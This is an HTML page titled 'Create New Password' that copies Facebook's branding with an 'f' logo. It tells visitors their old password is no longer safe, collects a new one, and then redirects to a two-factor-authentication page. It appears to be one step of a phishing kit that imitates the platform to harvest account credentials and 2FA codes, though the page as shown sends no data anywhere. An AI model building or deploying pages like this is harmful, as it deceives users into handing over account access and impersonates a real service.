<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Create New Password</title>
    <link rel="icon" href="/images/favicon.ico">
    <link rel="stylesheet" href="/styles/enter-new-password.css">
</head>
<body>
    <div class="app">
        <header class="app-header">
            <div class="header-inner">
                <div class="fb-brand">
                    <span class="fb-logo" aria-hidden="true">f</span>
                </div>
                <button class="back-btn" aria-label="Back">←</button>
            </div>
        </header>

        <main class="card">
            <h1 class="title">Now, Create a New Password</h1>
            <p class="subtitle">Your old password is no longer safe and you can't use it anymore.</p>

            <ul class="requirements-list">
                <li>Choose something you've never used before.</li>
                <li>Avoid passwords you use for other sites.</li>
                <li>Choose something hard for others to guess.</li>
            </ul>

            <form class="form" method="post" action="#" autocomplete="on">
                <label class="input-field">
                    <input type="password" name="new_password" placeholder="Enter new password" required>
                </label>
                <p class="help-text" id="password-help">Minimum 6 characters</p>
                <p class="error-text" id="password-error" style="display:none; color:red; font-size:13px; margin-top:4px;">Password must be at least 6 characters long</p>
                
                <button type="submit" class="primary-btn disabled">Save Changes</button>
            </form>
        </main>
    </div>

    
    <script>
        const passwordInput = document.querySelector('input[name="new_password"]');
        const passwordError = document.getElementById('password-error');
        const passwordHelp = document.getElementById('password-help');
        const submitBtn = document.querySelector('.primary-btn');
        const form = document.querySelector('.form');

        passwordInput.addEventListener('input', function() {
            if(this.value.length >= 6) {
                submitBtn.classList.remove('disabled');
            } else {
                submitBtn.classList.add('disabled');
            }
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            if(passwordInput.value.length < 6) {
                passwordError.style.display = 'block';
                passwordHelp.style.display = 'none';
            } else {
                passwordError.style.display = 'none'; 
                passwordHelp.style.display = 'block';

                window.location.href = "/two-factor-authentication.php";
            }
        });
    </script>

</body>
</html> 